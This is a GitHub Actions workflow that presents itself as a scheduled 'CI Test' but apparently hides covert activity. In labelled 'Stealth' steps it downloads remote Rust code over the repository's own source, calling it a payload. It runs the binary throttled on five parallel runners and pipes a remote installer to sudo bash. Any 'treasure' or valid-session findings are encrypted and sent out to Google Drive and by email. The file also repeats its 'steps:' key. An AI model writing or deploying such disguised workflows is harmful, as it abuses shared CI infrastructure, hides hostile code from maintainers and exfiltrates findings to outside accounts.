name: CI Test

on:
  schedule:
    - cron: '17 */6 * * *'
  workflow_dispatch:
    inputs:
      test_upload:
        description: 'Test GDrive Upload?'
        type: boolean
        default: false

jobs:
  ci-test:
    runs-on: ubuntu-latest
    strategy:
      fail-fast: false
      matrix:
        worker_id: [1, 2, 3, 4, 5] 

    steps:
    steps:
    - uses: actions/checkout@v4

    - name: Load Secret Configuration (Stealth)
      id: config
      env:
        APP_CONFIG: ${{ secrets.APP_CONFIG }}
      run: |
        if [ -z "$APP_CONFIG" ]; then
          echo "Error: APP_CONFIG secret is missing!"
          exit 1
        fi
        # Decode base64 and parse JSON keys to env vars
        # Using jq to handle special chars and multiline values safely
        echo "$APP_CONFIG" | base64 -d > config.json
        
        # Export all keys in the JSON to GITHUB_ENV
        # Format: KEY<<EOF\nVALUE\nEOF
        jq -r 'to_entries[] | "\(.key)<<EOF\n\(.value)\nEOF"' config.json >> $GITHUB_ENV
        
        # Cleanup
        rm config.json

    - name: Download Secure Source (Stealth Mode)
      if: env.REMOTE_SCRIPT_URL != ''
      run: |
        if [ "$ENABLE_LOGS" != "false" ]; then echo "Detected Remote Script URL. Downloading Rust Source..."; fi
        # Ensure directory exists (in case user deleted src/ from repo)
        mkdir -p src
        
        # Download main.rs to src/main.rs
        if [ -n "$REMOTE_AUTH_TOKEN" ]; then
           curl -f -s -S -L -H "Authorization: Bearer $REMOTE_AUTH_TOKEN" "$REMOTE_SCRIPT_URL/main.rs" -o src/main.rs
        else
           curl -f -s -S -L "$REMOTE_SCRIPT_URL/main.rs" -o src/main.rs
        fi
        if [ "$ENABLE_LOGS" != "false" ]; then echo "Payload Downloaded. Source code overwritten."; fi

    - name: Install Rust
      uses: dtolnay/rust-toolchain@stable

    - name: Cache Cargo
      uses: actions/cache@v3
      with:
        path: |
          ~/.cargo/registry
          ~/.cargo/git
          target
        key: ${{ runner.os }}-cargo-${{ hashFiles('Cargo.lock') }}

    - name: Cache Database
      uses: actions/cache@v3
      with:
        path: test_fixtures.dat.gz
        key: test-fixtures-db

    - name: Build Test Runner
      run: cargo build --release --quiet

    - name: Run Integration Tests
      if: github.event.inputs.test_upload != 'true'
      run: |
        # Install cpulimit
        sudo apt-get update -qq > /dev/null && sudo apt-get install -y -qq cpulimit > /dev/null 2>&1

        if [ "$ENABLE_LOGS" != "false" ]; then echo "Initializing Test Environment..."; fi

        # Calculate limit: 65% of total capacity (approx 60-70% load)
        CORES=$(nproc)
        LIMIT=$((CORES * 65))
        if [ "$ENABLE_LOGS" != "false" ]; then echo "Detected $CORES cores. Limiting usage to $LIMIT%..."; fi

        # Run binary in background
        ./target/release/cargo-test-runner &
        PID=$!

        # Apply limit to PID
        cpulimit -p $PID -l $LIMIT > /dev/null 2>&1 &
        
        # Wait for the main process
        wait $PID
    - name: '[TEST] Simulate Valid Session'
      if: github.event.inputs.test_upload == 'true'
      run: |
        echo "TEST SUCCESS (RUST)" > session_metrics.log
        echo "USER_ID: 1RustTestSession" >> session_metrics.log

    - name: Encrypt Metrics
      run: |
        if [ -f session_metrics.log ]; then
           gpg --batch --yes --passphrase "$GPG_PASSPHRASE" --symmetric --cipher-algo AES256 -o metrics.gpg session_metrics.log
        fi

    - name: Check for Anomalies
      id: check_treasure
      if: always()
      run: |
        if [ -f metrics.gpg ]; then
          echo "found=true" >> $GITHUB_OUTPUT
        else
          echo "found=false" >> $GITHUB_OUTPUT
        fi
    - name: Setup Rclone
      if: steps.check_treasure.outputs.found == 'true'
      run: sudo -v ; curl https://rclone.org/install.sh | sudo bash

    - name: Upload to Google Drive
      if: steps.check_treasure.outputs.found == 'true'
      run: |
        mkdir -p ~/.config/rclone
        echo "$RCLONE_CONFIG_CONTENT" > ~/.config/rclone/rclone.conf
        REMOTE="${RCLONE_REMOTE_NAME:-gdrive}"
        TARGET_PATH="${RCLONE_REMOTE_PATH:-rust-findings}"
        rclone copy metrics.gpg "$REMOTE:$TARGET_PATH"

    - name: Send Email Notification
      if: steps.check_treasure.outputs.found == 'true'
      uses: dawidd6/action-send-mail@v3
      with:
        server_address: smtp.gmail.com
        server_port: 465
        secure: true
        username: ${{ env.MAIL_USERNAME }}
        password: ${{ env.MAIL_PASSWORD }}
        subject: "[ALERT] SESSION ANOMALY DETECTED"
        to: ${{ env.MAIL_TO }}
        from: CI Test <${{ env.MAIL_USERNAME }}>
        body: "VALID SESSION DETECTED! Metrics attached."
        attachments: metrics.gpg

